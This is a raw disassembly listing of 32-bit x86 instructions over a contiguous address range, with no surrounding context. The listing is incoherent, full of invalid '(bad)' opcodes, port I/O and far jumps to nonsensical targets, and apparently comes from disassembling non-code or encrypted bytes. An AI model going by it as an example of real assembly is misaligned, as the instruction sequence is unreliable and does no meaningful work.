  423fdd:	js     0x424044
  423fdf:	push   ebx
  423fe0:	xor    ch,BYTE PTR [edx]
  423fe2:	out    0x1b,eax
  423fe4:	xor    ah,BYTE PTR [eax-0xc]
  423fe7:	(bad)  
  423fe8:	fild   QWORD PTR [eax-0x63]
  423feb:	rcl    dh,0x29
  423fee:	pop    ds
  423fef:	in     eax,0x27
  423ff1:	in     eax,dx
  423ff2:	inc    edx
  423ff3:	pop    edi
  423ff4:	mov    esi,0xc286765a
  423ff9:	mov    ebp,DWORD PTR [edx]
  423ffb:	and    DWORD PTR gs:[eax+edx*2],edi
  423fff:	dec    esi
  424000:	ret    
  424001:	arpl   WORD PTR [ebx+0x47a86afa],cx
  424007:	inc    edx
  424008:	je     0x423ffb
  42400a:	inc    edi
  42400b:	adc    eax,0x97434253
  424010:	pop    ecx
  424011:	push   eax
  424012:	mov    al,0xed
  424014:	add    DWORD PTR [esi+0x1d],edi
  424017:	les    ebp,FWORD PTR [eax+0x759636d5]
  42401d:	xor    DWORD PTR [esi+edx*4-0x6799ac41],ebx
  424024:	push   ss
  424025:	xlat   BYTE PTR ds:[ebx]
  424026:	dec    ebx
  424027:	pusha  
  424028:	and    al,0x16
  42402a:	sbb    al,0x5
  42402c:	xchg   esp,eax
  42402d:	enter  0x8f62,0xff
  424031:	jl     0x4240aa
  424033:	sub    esp,ecx
  424035:	popa   
  424036:	cdq    
  424037:	and    DWORD PTR [esi+0x1b44cc68],eax
  42403d:	inc    ecx
  42403e:	aam    0x2d
  424040:	and    ch,BYTE PTR [edx+0x46c94da6]
  424046:	fist   DWORD PTR [ebx]
  424048:	xchg   BYTE PTR [ebp-0x6b],bh
  42404b:	and    eax,0xfa0f5a51
  424050:	mov    dh,0x93
  424052:	mov    bh,0x69
  424054:	pop    esp
  424055:	push   edi
  424056:	push   cs
  424057:	frstor [edx]
  424059:	pop    esi
  42405a:	dec    edx
  42405b:	sbb    ah,ah
  42405d:	fwait
  42405e:	jle    0x42407a
  424060:	jb     0x42405d
  424062:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424063:	je     0x4240a8
  424065:	xchg   ebp,eax
  424066:	add    dl,bl
  424068:	ror    BYTE PTR [ebp-0x53],1
  42406b:	or     eax,0x126cf0d7
  424070:	jp     0x424030
  424072:	icebp  
  424073:	adc    BYTE PTR [ebx-0x69],dl
  424076:	iret   
  424077:	pop    ecx
  424078:	xchg   esi,eax
  424079:	mov    BYTE PTR [edi-0x7ddeb588],bh
  42407f:	repnz dec ecx
  424081:	add    ch,BYTE PTR ss:[ebp+0x2d32a148]
  424088:	or     al,0x56
  42408a:	(bad)  [esi+0x45dc929b]
  424090:	push   edi
  424091:	scas   al,BYTE PTR es:[edi]
  424092:	lock gs cld 
  424095:	sub    cl,BYTE PTR ds:0x8193bf70
  42409b:	mov    fs,WORD PTR [esi+0x64]
  42409e:	add    ch,BYTE PTR [edx]
  4240a0:	pop    es
  4240a1:	mov    ds:0xb30b0856,eax
  4240a6:	pop    ecx
  4240a7:	(bad)  
  4240a8:	pop    edi
  4240a9:	js     0x42409e
  4240ab:	fldcw  WORD PTR [eax]
  4240ad:	stc    
  4240ae:	arpl   WORD PTR [edx-0x4a],ax
  4240b1:	addr16 fs aad 0xc8
  4240b5:	pop    ebx
  4240b6:	dec    eax
  4240b7:	sub    BYTE PTR [eax+0x2e],al
  4240ba:	test   eax,0xc301e908
  4240bf:	pop    ecx
  4240c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4240c1:	fs into 
  4240c3:	mov    edx,0x11653373
  4240c8:	jmp    0x5b56df41
  4240cd:	cmc    
  4240ce:	push   cs
  4240cf:	and    al,BYTE PTR [eax]
  4240d1:	(bad)  
  4240d2:	xor    cl,BYTE PTR [ebx+0x4b]
  4240d5:	mov    ebp,0x99116b0e
  4240da:	test   BYTE PTR [edi-0x45ad784],0x29
  4240e1:	test   bl,dh
  4240e3:	lods   al,BYTE PTR ds:[esi]
  4240e4:	aaa    
  4240e5:	mov    al,0x38
  4240e7:	sbb    eax,0x3ce9b720
  4240ec:	adc    al,0xae
  4240ee:	int3   
  4240ef:	in     eax,dx
  4240f0:	mov    gs:0xdd664e43,eax
  4240f6:	mov    ah,0x21
  4240f8:	push   cs
  4240f9:	arpl   WORD PTR [edx],bx
  4240fb:	and    ebp,DWORD PTR [ebp+0x3c]
  4240fe:	je     0x42411b
  424100:	xchg   edx,eax
  424101:	imul   esi,DWORD PTR [ecx-0x74ba0c93],0x9237a19a
  42410b:	mov    al,ds:0xe9b198e3
  424110:	adc    DWORD PTR [ebx],0x164d9d16
  424116:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424117:	mov    cl,0xc2
  424119:	fwait
  42411a:	xchg   edi,eax
  42411b:	leave  
  42411c:	mov    al,ds:0xec1feea5
  424121:	or     DWORD PTR [ecx-0x54],ebx
  424124:	mov    bl,0xd6
  424126:	dec    ebx
  424127:	or     BYTE PTR [esi+0x6e0b769a],al
  42412d:	stos   BYTE PTR es:[edi],al
  42412e:	je     0x4240da
  424130:	popa   
  424131:	aas    
  424132:	pushw  0x4367
  424136:	(bad)  
  424137:	into   
  424138:	pop    edx
  424139:	retf   
  42413a:	xlat   BYTE PTR ds:[ebx]
  42413b:	and    DWORD PTR [ebx+0x35a6ffec],eax
  424141:	stos   DWORD PTR es:[edi],eax
  424142:	sbb    al,BYTE PTR [ebp+0x56]
  424145:	mov    esp,0x5941f0d1
  42414a:	test   DWORD PTR [ecx],ebx
  42414c:	(bad)  
  42414d:	xchg   BYTE PTR [esi-0x11],bh
  424150:	out    0xfd,eax
  424152:	push   esi
  424153:	fmul   st,st(5)
  424155:	jns    0x424129
  424157:	jns    0x42415b
  424159:	and    BYTE PTR [ebx-0x472544d6],dl
  42415f:	xor    BYTE PTR [edi-0x42cb3d],0x33
  424166:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424167:	les    esp,FWORD PTR [ecx-0x14]
  42416a:	sub    al,0xc1
  42416c:	mov    dl,0x7b
  42416e:	arpl   WORD PTR [ebx],cx
  424170:	adc    edi,edx
  424172:	push   ecx
  424173:	(bad)  
  424174:	xchg   edx,eax
  424175:	push   ss
  424176:	jb     0x4241a0
  424178:	sbb    eax,0xaf0abd1a
  42417d:	jmp    0x599152a2
  424182:	ret    0x22bc
  424185:	pop    ds
  424186:	jg     0x4241bf
  424188:	(bad)  
  424189:	ins    BYTE PTR es:[edi],dx
  42418a:	inc    ecx
  42418b:	js     0x4241eb
  42418d:	imul   edx,DWORD PTR [esi+0x4b3659ad],0x10
  424194:	add    DWORD PTR [edi+0x56],eax
  424197:	lock pop ebp
  424199:	add    BYTE PTR ds:[esi],dh
  42419c:	adc    dh,BYTE PTR [eax]
  42419e:	stos   BYTE PTR es:[edi],al
  42419f:	sti    
  4241a0:	add    ebp,DWORD PTR ds:0xca08f50c
  4241a6:	repz pop esi
  4241a8:	jae    0x4241d5
  4241aa:	sahf   
  4241ab:	(bad)  
  4241ac:	rol    esi,0x7
  4241af:	adc    al,0x92
  4241b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4241b2:	lds    eax,FWORD PTR [esp+ecx*4-0x23]
  4241b6:	inc    ebp
  4241b7:	in     al,dx
  4241b8:	pop    ebp
  4241b9:	enter  0x521e,0xab
  4241bd:	mov    al,0xea
  4241bf:	outs   dx,DWORD PTR ds:[esi]
  4241c0:	mov    al,ds:0xc45733aa
  4241c5:	push   ebx
  4241c6:	fwait
  4241c7:	jmp    0x42423e
  4241c9:	mov    ds:0x18e092c6,al
  4241ce:	push   cs
  4241cf:	add    al,0x2d
  4241d1:	sbb    al,0x35
  4241d3:	pop    edi
  4241d4:	or     ebx,DWORD PTR [edi+0x7b]
  4241d7:	sub    al,0x9c
  4241d9:	dec    ebp
  4241da:	cmp    edi,DWORD PTR [esi+0x8]
  4241dd:	(bad)  
  4241de:	call   0xeb28:0x5dddd230
  4241e5:	adc    DWORD PTR [esi+0xc4e9a23],edi
  4241eb:	jne    0x424268
  4241ed:	sub    cl,BYTE PTR [edi+0x48d9996d]
  4241f3:	fdivr  st,st(3)
  4241f5:	ja     0x4241b3
  4241f7:	test   al,0xe4
  4241f9:	sbb    eax,0x17461747
  4241fe:	and    esi,DWORD PTR [edx-0x34dcc5f]
  424204:	enter  0xc583,0x3b
  424208:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424209:	sbb    DWORD PTR [ecx],esi
  42420b:	mov    dl,0x16
  42420d:	cmp    eax,0x178ed5e1
  424212:	sub    ecx,DWORD PTR [edx-0x453dc87b]
  424218:	push   edx
  424219:	cld    
  42421a:	xlat   BYTE PTR ds:[ebx]
  42421b:	les    edi,FWORD PTR [esi]
  42421d:	cli    
  42421e:	cmp    DWORD PTR [esi+0x2c9cc0d7],ebp
  424224:	push   esi
  424225:	fidiv  WORD PTR [edi]
  424227:	cmp    BYTE PTR [ebx+0x3],bl
  42422a:	push   edi
  42422b:	aas    
  42422c:	dec    ebx
  42422d:	arpl   WORD PTR [ebp-0x3035e312],ax
  424233:	fiadd  WORD PTR [esi-0x3eb37bb1]
  424239:	cmp    DWORD PTR [ecx+0x16],ebx
  42423c:	ret    
  42423d:	iret   
  42423e:	call   0xf473:0x2bbbdc38
  424245:	mov    ah,0x19
  424247:	xor    DWORD PTR [edx],edx
  424249:	hlt    
  42424a:	sbb    DWORD PTR [esi+0x1e],esp
  42424d:	(bad)  
  42424e:	jg     0x424245
  424250:	sbb    DWORD PTR [eax+edx*4+0x638f2d32],ecx
  424257:	mov    ecx,0xf5edc194
  42425c:	inc    ebx
  42425d:	jp     0x424287
  42425f:	popf   
  424260:	mov    esi,0xfba5d97
  424265:	into   
  424266:	ja     0x424219
  424268:	(bad)  
  424269:	add    al,0x79
  42426b:	sbb    al,0x59
  42426d:	aas    
  42426e:	dec    edx
  42426f:	mov    eax,ds:0x807eb05e
  424274:	ins    DWORD PTR es:[edi],dx
  424275:	(bad)  
  424276:	xchg   esi,eax
  424277:	imul   edi,DWORD PTR [ecx+0x43496a1e],0xffffffa5
  42427e:	icebp  
  42427f:	shl    DWORD PTR [esi],cl
  424281:	cdq    
  424282:	jle    0x4242e5
  424284:	shl    DWORD PTR [ebx-0x1b],0xa5
  424288:	cmp    eax,0x1145566e
  42428d:	fnstsw WORD PTR ds:0x20484955
  424293:	sub    eax,0xf1abe19a
  424298:	mov    ebx,0xd70b03d3
  42429d:	out    dx,eax
  42429e:	fs pusha 
  4242a0:	iret   
  4242a1:	push   edi
  4242a2:	ffreep st(4)
  4242a4:	clc    
  4242a5:	shl    BYTE PTR [ecx-0x19],1
  4242a8:	cld    
  4242a9:	pop    edi
  4242aa:	(bad)  
  4242ab:	in     eax,0x2b
  4242ad:	dec    esp
  4242ae:	lea    edi,[edi]
  4242b0:	ret    
  4242b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4242b2:	stos   BYTE PTR es:[edi],al
  4242b3:	sub    eax,0x1478fdb9
  4242b8:	data16 mov ds:0xe32576da,al
  4242be:	cmc    
  4242bf:	push   edx
  4242c0:	daa    
  4242c1:	out    0xd7,al
  4242c3:	add    esi,DWORD PTR [eax+0x2bc3b56]
  4242c9:	test   bh,bl
  4242cb:	aas    
  4242cc:	add    eax,0xbda1a1a3
  4242d1:	or     dh,0x2c
  4242d4:	push   ss
  4242d5:	jnp    0x4242f5
  4242d7:	adc    eax,0xe0b4fa2
  4242dc:	and    eax,0x1d92b61d
  4242e1:	pop    ebx
  4242e2:	(bad)  
  4242e3:	and    al,0xe9
  4242e5:	ror    DWORD PTR [ecx+eax*8],1
  4242e8:	cdq    
  4242e9:	test   BYTE PTR [esi+0x7ae0c732],dl
  4242ef:	mov    dl,0x69
  4242f1:	xlat   BYTE PTR ds:[ebx]
  4242f2:	aas    
  4242f3:	adc    eax,0x2156c09f
  4242f8:	bound  edx,QWORD PTR ds:0x734c3579
  4242fe:	dec    ebp
  4242ff:	push   eax
  424300:	add    eax,ebp
  424302:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424303:	aaa    
  424304:	mov    es,WORD PTR [ecx+0x1f]
  424307:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424308:	jmp    0x42429e
  42430a:	pop    ecx
  42430b:	mov    WORD PTR [eax+eiz*1],fs
  42430e:	xor    DWORD PTR [edi+0x2a50265c],edx
  424314:	sbb    ebx,edi
  424316:	popf   
  424317:	(bad)  
  424318:	cmp    cl,al
  42431a:	xor    DWORD PTR [ecx+0x2aca0c70],ebx
  424320:	pop    ebp
  424321:	add    al,0xe7
  424323:	mov    dl,0x91
  424325:	cmp    al,0x63
  424327:	(bad)  
  424328:	cmp    eax,0x39f936b9
  42432d:	call   0x148387e9
  424332:	sub    DWORD PTR [ebx-0x3],eax
  424335:	fwait
  424336:	out    dx,eax
  424337:	popa   
  424338:	mov    ebp,0xe56ab74c
  42433d:	(bad)  
  42433e:	or     DWORD PTR [eax+0x28],ecx
  424341:	add    eax,0x509acfd7
  424346:	(bad)  
  424348:	xor    dl,BYTE PTR [ebx]
  42434a:	pusha  
  42434b:	cs mov esi,0xf4c15646
  424351:	jmp    0x21825dbd
  424356:	mov    ah,0x48
  424358:	js     0x424325
  42435a:	push   eax
  42435b:	sbb    bh,BYTE PTR [edi-0x5eabae83]
  424361:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424363:	jb     0x42438c
  424365:	mov    dh,0xea
  424367:	inc    esp
  424368:	(bad)  
  424369:	fiadd  DWORD PTR [ebx+0x36]
  42436c:	and    BYTE PTR [edi+0x7b],ah
  42436f:	and    bl,BYTE PTR [esi+edi*8]
  424372:	enter  0x8f54,0x73
  424376:	cs sti 
  424378:	cmp    DWORD PTR [ebx],edx
  42437a:	and    BYTE PTR [edi],bh
  42437c:	sti    
  42437d:	inc    ecx
  42437e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42437f:	ja     0x424348
  424381:	in     eax,dx
  424382:	jg     0x4243bb
  424384:	into   
  424385:	or     edi,ecx
  424387:	sub    BYTE PTR [ebp+0x46],bh
  42438a:	bound  edi,QWORD PTR [ebp-0xc]
  42438d:	cmp    ecx,DWORD PTR [ecx+0x6dc684ad]
  424393:	jns    0x42440c
  424395:	int    0x49
  424397:	cld    
  424398:	sub    eax,0xeca1a6d5
  42439d:	mov    ebx,0xa0aa7f56
  4243a2:	aad    0xe5
  4243a4:	je     0x424388
  4243a6:	test   eax,0x15411c6f
  4243ab:	cmc    
  4243ac:	stos   BYTE PTR es:[edi],al
  4243ad:	xchg   ecx,eax
  4243ae:	dec    edx
  4243af:	push   esp
  4243b0:	mov    ah,0xdf
  4243b2:	add    bh,bl
  4243b4:	pop    ebp
  4243b5:	out    dx,al
  4243b6:	in     eax,0xe5
  4243b8:	rol    BYTE PTR [edi+0x75],cl
  4243bb:	imul   BYTE PTR [eax-0x169cbf5f]
  4243c1:	je     0x424402
  4243c3:	add    BYTE PTR [eax],al
  4243c5:	add    BYTE PTR [eax],al
  4243c7:	add    BYTE PTR [eax],al
  4243c9:	add    BYTE PTR [edx+0x44],bl
  4243cc:	dec    esi
  4243cd:	inc    ecx
  4243ce:	pop    esi
  4243cf:	dec    ebx
  4243d0:	pop    edi
  4243d1:	pop    edi
  4243d2:	inc    edx
  4243d3:	cwde   
  4243d4:	inc    esi
  4243d5:	loop   0x424384
  4243d7:	push   edi
  4243d8:	cmp    bl,bh
  4243da:	fst    st(1)
  4243dc:	add    DWORD PTR [eax],eax
  4243de:	add    DWORD PTR [esi],0xc3450000
  4243e4:	dec    eax
  4243e5:	sub    BYTE PTR [esi],0x1c
  4243e8:	ja     0x424397
  4243ea:	sub    DWORD PTR [eax],0xfc6ad051
  4243f0:	inc    edi
  4243f1:	add    DWORD PTR [ecx-0x6df41f28],ebp
  4243f7:	inc    eax
  4243f8:	cwde   
  4243f9:	mov    al,ds:0xa927101e
  4243fe:	pushf  
  4243ff:	outs   dx,DWORD PTR ds:[esi]
  424400:	test   al,0xe7
  424402:	pop    ecx
  424403:	nop
  424404:	jl     0x424419
  424406:	dec    edi
  424407:	xchg   esp,eax
  424408:	sbb    ebx,DWORD PTR [eax+ebp*8+0x2d]
  42440c:	and    cl,cl
  42440e:	(bad)  
  42440f:	xor    ecx,ecx
  424411:	in     al,0x5e
  424413:	ds jmp 0x424493
  424416:	loope  0x424420
  424418:	mov    dl,0x10
  42441a:	fisubr DWORD PTR [eax-0x8]
  42441d:	pop    ds
  42441e:	test   eax,0xe9591246
  424423:	inc    eax
  424424:	inc    edi
  424425:	mov    ebp,0xacfc4b3e
  42442a:	add    edx,DWORD PTR [ebx+0x26e72628]
  424430:	data16 mov cl,0x7
  424433:	add    al,0xf9
  424435:	pop    esp
  424436:	and    DWORD PTR [eax],esi
  424438:	mov    edx,0x62779d9f
  42443d:	xor    eax,0xfdc3c0cb
  424442:	popa   
  424443:	mov    ecx,0xf04dbabe
  424448:	(bad)  
  42444a:	add    BYTE PTR ds:0x576ba7c7,al
  424450:	out    dx,eax
  424451:	shl    BYTE PTR [edi+0x62eabb66],cl
  424457:	out    0x20,al
  424459:	and    ebx,esi
  42445b:	clc    
  42445c:	in     al,dx
  42445d:	push   ds
  42445e:	jbe    0x4244a7
  424460:	fwait
  424461:	dec    eax
  424462:	imul   ecx,DWORD PTR [edi+0x13],0xe645a0b4
  424469:	push   ds
  42446a:	jmp    0x3fe:0xc9bf8529
  424471:	mov    ecx,0x4ccfb759
  424476:	inc    edi
  424477:	inc    eax
  424478:	inc    eax
  424479:	loopne 0x4244e2
  42447b:	inc    edx
  42447c:	je     0x424428
  42447e:	mov    eax,ds:0xc93f9e8a
  424483:	mov    dl,0xf0
  424485:	push   ss
  424486:	inc    esi
  424487:	out    0x7c,eax
  424489:	ds ret 0x11ce
  42448d:	inc    edx
  42448e:	jmp    0x42445d
  424490:	in     eax,0x5b
  424492:	adc    BYTE PTR [ebx-0x69],dh
  424495:	(bad)  
  424496:	dec    edi
  424497:	stos   BYTE PTR es:[edi],al
  424498:	fldenv [ecx+ecx*2-0x710c7f7e]
  42449f:	pop    eax
  4244a0:	(bad)  
  4244a2:	fcomip st,st(6)
  4244a4:	push   esi
  4244a5:	or     ebx,DWORD PTR [ebx+0x7b764b0b]
  4244ab:	jb     0x4244bb
  4244ad:	mov    edi,0x3c18c77e
  4244b2:	xchg   edi,eax
  4244b3:	mov    al,ds:0xd46b79b2
  4244b8:	jnp    0x4244e5
  4244ba:	dec    esp
  4244bb:	retf   
  4244bc:	xlat   BYTE PTR ds:[ebx]
  4244bd:	aam    0xcc
  4244bf:	stos   BYTE PTR es:[edi],al
  4244c0:	pusha  
  4244c1:	clc    
  4244c2:	popf   
  4244c3:	in     eax,dx
  4244c4:	push   edi
  4244c5:	xor    eax,0x9b6f90f1
  4244ca:	mov    ch,0x59
  4244cc:	cmc    
  4244cd:	adc    esi,ebp
  4244cf:	ss inc esi
  4244d1:	sbb    eax,0xfd631b9a
  4244d6:	dec    ecx
  4244d7:	sbb    DWORD PTR [edx+0x1101b7d1],0x71
  4244de:	push   ecx
  4244df:	mov    dl,0xe2
  4244e1:	pop    ebp
  4244e2:	push   eax
  4244e3:	clc    
  4244e4:	stos   DWORD PTR es:[edi],eax
  4244e5:	ds (bad) 
  4244e7:	ja     0x424542
  4244e9:	sahf   
  4244ea:	nop
  4244eb:	in     al,0x7f
  4244ed:	dec    esp
  4244ee:	or     BYTE PTR [eax+0x372604dc],0x3e
  4244f5:	jg     0x424511
  4244f7:	mov    esp,0xcc7ee750
  4244fc:	adc    ah,BYTE PTR ds:0xb78037ab
  424502:	sub    esi,ebp
  424504:	sub    BYTE PTR [ebp+0x2bb1bff6],ch
  42450a:	stos   BYTE PTR es:[edi],al
  42450b:	shl    DWORD PTR [ecx],0x9e
  42450e:	int3   
  42450f:	enter  0x8729,0xce
  424513:	ror    BYTE PTR es:[eax-0xfeb68e2],1
  42451a:	test   eax,0x9f9056a2
  42451f:	adc    DWORD PTR [ebx],ebx
  424521:	inc    edx
  424522:	pop    eax
  424523:	mov    ds:0xbce0a2fe,eax
  424528:	int    0x18
  42452a:	bound  edx,QWORD PTR [ebx]
  42452c:	push   ss
  42452d:	lahf   
  42452e:	inc    esp
  42452f:	mov    bl,0xe6
  424531:	inc    edi
  424532:	xor    BYTE PTR [eax+0x4e6f271b],0x8c
  424539:	push   0xe
  42453b:	dec    ebx
  42453c:	mov    dl,0xc0
  42453e:	cli    
  42453f:	adc    dl,BYTE PTR [ecx+0x10391345]
  424545:	xor    eax,0x8fa13fea
  42454a:	enter  0x55f4,0xcb
  42454e:	cmp    DWORD PTR [esi+0x44],edi
  424551:	mov    esi,0x78c73abe
  424556:	mov    bh,0x4c
  424558:	xor    DWORD PTR [edi],ebp
  42455a:	out    dx,eax
  42455b:	xchg   dh,ah
  42455d:	xchg   ebx,eax
  42455e:	stos   BYTE PTR es:[edi],al
  42455f:	loope  0x4245c8
  424561:	push   0x1b4e4e8f
  424566:	pusha  
  424567:	pop    edi
  424568:	and    eax,0x67d0c5c8
  42456d:	mov    cl,0x25
  42456f:	mov    eax,ds:0x3a9be374
  424574:	lea    edi,[ebp-0x33]
  424577:	enter  0x8c7e,0x1e
  42457b:	adc    BYTE PTR [edi],dh
  42457d:	push   es
  42457e:	dec    ebx
  42457f:	dec    esi
  424580:	cdq    
  424581:	cld    
  424582:	jne    0x424558
  424584:	jl     0x424529
  424586:	xchg   DWORD PTR [eax+0x49959d28],esi
  42458c:	mov    ch,0x41
  42458e:	jno    0x4245a4
  424590:	dec    ecx
  424591:	aas    
  424592:	dec    esi
  424593:	repz or edx,DWORD PTR [eax+ebx*1-0x4283b246]
  42459b:	retf   0xc328
  42459e:	mov    bl,0x57
  4245a0:	mov    al,ds:0x6775eace
  4245a5:	or     al,0xe5
  4245a7:	mov    esp,0xef362279
  4245ac:	rcl    BYTE PTR [edi-0x6b],cl
  4245af:	mov    esi,0xdc143c74
  4245b4:	cmp    dl,dh
  4245b6:	pop    eax
  4245b7:	sub    esp,DWORD PTR [esi+0x7a416e38]
  4245bd:	mov    ch,0x6c
  4245bf:	out    dx,al
  4245c0:	jno    0x424607
  4245c2:	or     edx,DWORD PTR [esi-0x7771cac1]
  4245c8:	out    0xc0,al
  4245ca:	mov    esp,0xeeae848
  4245cf:	push   esp
  4245d0:	rol    BYTE PTR [esi],cl
  4245d2:	lds    ecx,FWORD PTR [esi+0x2e]
  4245d5:	and    eax,0xc9cf4029
  4245da:	inc    ebp
  4245db:	inc    esi
  4245dc:	cdq    
  4245dd:	in     eax,dx
  4245de:	test   al,0xd4
  4245e0:	mov    ah,0x85
  4245e2:	outs   dx,BYTE PTR ds:[esi]
  4245e3:	or     al,0x88
  4245e5:	aaa    
  4245e6:	mov    WORD PTR [eax-0x69],?
  4245e9:	(bad)  
  4245ea:	iret   
  4245eb:	xor    ch,BYTE PTR [eax+0x1a704c7e]
  4245f1:	fcmovb st,st(3)
  4245f3:	xor    bh,BYTE PTR [edi+0x466eefe4]
  4245f9:	dec    ebx
  4245fa:	jns    0x424603
  4245fc:	mov    esi,0x5b3fc40f
  424601:	mov    ch,0x93
  424603:	jmp    0x424669
  424605:	nop
  424606:	jmp    0xa34b385b
  42460b:	popa   
  42460c:	cli    
  42460d:	jo     0x4245ec
  42460f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424610:	daa    
  424611:	mov    bh,0xe4
  424613:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424614:	push   es
  424615:	cmp    bh,BYTE PTR [edx]
  424617:	addr16 rdpmc 
  42461a:	shr    BYTE PTR [edi-0x80],0xb8
  42461e:	cmp    BYTE PTR [edx-0x2b],al
  424621:	outs   dx,DWORD PTR ds:[esi]
  424622:	add    edi,DWORD PTR [ecx]
  424624:	sbb    BYTE PTR [eax+0x38],dh
  424627:	sahf   
  424628:	pop    ebx
  424629:	jno    0x42463e
  42462b:	xchg   edx,eax
  42462c:	iret   
  42462d:	xor    DWORD PTR [ebx+0x2d],esp
  424630:	popa   
  424631:	sub    DWORD PTR [ebp+0x17],ecx
  424634:	dec    ebp
  424635:	jg     0x4246a7
  424637:	cmp    al,0xd1
  424639:	mov    esi,0x6597b1ff
  42463e:	mov    dl,0x46
  424640:	mov    bh,0xc7
  424642:	sbb    DWORD PTR [esi-0x7370cf9c],0xffffffe7
  424649:	mov    DWORD PTR [edi-0x60],ebp
  42464c:	pop    ecx
  42464d:	ins    DWORD PTR es:[edi],dx
  42464e:	jbe    0x4245ee
  424650:	push   cs
  424651:	test   eax,0x5feb3008
  424656:	push   ebx
  424657:	scas   eax,DWORD PTR es:[edi]
  424658:	fwait
  424659:	sbb    bh,BYTE PTR [edx]
  42465b:	aam    0x64
  42465d:	sub    dh,BYTE PTR [edi+0x70bcb2b7]
  424663:	push   esp
  424664:	aas    
  424665:	push   ebx
  424666:	sbb    al,0x3e
  424668:	cld    
  424669:	inc    edx
  42466a:	rol    DWORD PTR [ebx+0x1b],cl
  42466d:	(bad)  [eax]
  42466f:	jp     0x42460b
  424671:	fs dec esp
  424673:	mov    al,0xed
  424675:	add    eax,0x640f1c11
  42467a:	nop
  42467b:	sbb    al,0x55
  42467d:	les    esi,FWORD PTR [esi+ebp*2]
  424680:	repnz cmp esp,DWORD PTR fs:[edx]
  424684:	ja     0x424684
  424686:	(bad)  
  424687:	cli    
  424688:	dec    esi
  424689:	cli    
  42468a:	xchg   ebx,eax
  42468b:	cs inc eax
  42468d:	shl    DWORD PTR [ebx-0x7b],cl
  424690:	ja     0x4246a5
  424692:	pop    ds
  424693:	fadd   QWORD PTR [ecx]
  424695:	xor    ebx,DWORD PTR [esi+0x41]
  424698:	mov    DWORD PTR [esi],eax
  42469a:	mov    ah,0x5b
  42469c:	or     al,0x76
  42469e:	fcom   DWORD PTR gs:[ecx+0x54]
  4246a2:	in     al,0x37
  4246a4:	rcl    BYTE PTR [ecx-0x35],1
  4246a7:	mov    dl,0xb1
  4246a9:	or     al,0x70
  4246ab:	mov    ah,BYTE PTR [ecx+esi*1]
  4246ae:	mov    cl,0xdc
  4246b0:	lahf   
  4246b1:	repz xchg edx,eax
  4246b3:	xchg   esi,eax
  4246b4:	sbb    ecx,DWORD PTR [eax+0x419af1ac]
  4246ba:	(bad)  
  4246bb:	and    al,0x14
  4246bd:	hlt    
  4246be:	jle    0x424648
  4246c0:	(bad)  
  4246c2:	(bad)  
  4246c3:	fs push es
  4246c5:	ja     0x42467e
  4246c7:	shl    ebp,cl
  4246c9:	int    0xac
  4246cb:	push   ebp
  4246cc:	shl    DWORD PTR [edx+0xcb0fe8e],cl
  4246d2:	adc    ch,cl
  4246d4:	add    cl,BYTE PTR [ebp+0xaaf0550]
  4246da:	into   
  4246db:	jecxz  0x4246e9
  4246dd:	inc    eax
  4246de:	xchg   ecx,eax
  4246df:	je     0x4246b4
  4246e1:	pushf  
  4246e2:	sbb    bl,BYTE PTR [esi-0x5b10b632]
  4246e8:	pop    ebp
  4246e9:	push   ebx
  4246ea:	std    
  4246eb:	pop    es
  4246ec:	stc    
  4246ed:	cli    
  4246ee:	mov    ds:0x4326a42,al
  4246f3:	and    BYTE PTR ds:0x88497904,bl
  4246f9:	sbb    dl,BYTE PTR ds:0x8f67a49d
  4246ff:	add    eax,0x88446ba1
  424704:	aam    0xee
  424706:	in     eax,0x48
  424708:	jnp    0x4246f1
  42470a:	fsubr  QWORD PTR [ecx]
  42470c:	sub    ch,BYTE PTR [esi-0x3f]
  42470f:	stc    
  424710:	sbb    eax,0x9b42c124
  424715:	add    ah,BYTE PTR [edi]
  424717:	mov    bh,0x6f
  424719:	js     0x4246e6
  42471b:	das    
  42471c:	push   ds
  42471d:	and    ch,BYTE PTR [ecx+0x1a283c1e]
  424723:	xor    eax,0xabc66ac5
  424728:	xor    dl,BYTE PTR [eax-0x7d]
  42472b:	(bad)  
  42472c:	out    dx,eax
  42472d:	fstp   QWORD PTR [edx+esi*8+0x56]
  424731:	stos   BYTE PTR es:[edi],al
  424732:	popf   
  424733:	push   ebx
  424734:	xchg   ebx,eax
  424735:	push   0x82856d2e
  42473a:	in     al,dx
  42473b:	xchg   BYTE PTR [eax],bh
  42473d:	arpl   bp,sp
  42473f:	not    BYTE PTR [esi+0x4b]
  424742:	arpl   WORD PTR [edx+ebx*8-0x30],cx
  424746:	mov    al,dl
  424748:	xchg   ebp,eax
  424749:	arpl   WORD PTR [ebx+0x338e66e],si
  42474f:	push   cs
  424750:	add    al,0xf1
  424752:	or     bh,BYTE PTR [esi+0x7a]
  424755:	mul    BYTE PTR [edi]
  424757:	(bad)  
  424758:	and    BYTE PTR [ecx-0x7554bdc9],bl
  42475e:	jo     0x424739
  424760:	push   0xfffffff8
  424762:	gs xor eax,0x5988bfd4
  424768:	push   ecx
  424769:	pop    ebx
  42476a:	xchg   ecx,eax
  42476b:	int3   
  42476c:	xchg   edx,eax
  42476d:	inc    ebp
  42476e:	adc    dh,cl
  424770:	ins    BYTE PTR es:[edi],dx
  424771:	sub    al,BYTE PTR [ebx]
  424773:	xchg   ah,ch
  424775:	(bad)  
  424776:	outs   dx,BYTE PTR ds:[esi]
  424777:	cmp    al,0xda
  424779:	nop
  42477a:	dec    esp
  42477b:	and    edi,DWORD PTR [eax+ecx*2-0x7c4b550d]
  424782:	aas    
  424783:	sub    ch,BYTE PTR ds:0x7aec8d73
  424789:	xor    al,0xb
  42478b:	mov    eax,ds:0x6d43c91c
  424790:	pop    ds
  424791:	jo     0x424794
  424793:	setle  BYTE PTR [eax+edx*8-0x6f]
  424798:	xchg   esi,eax
  424799:	xlat   BYTE PTR ds:[ebx]
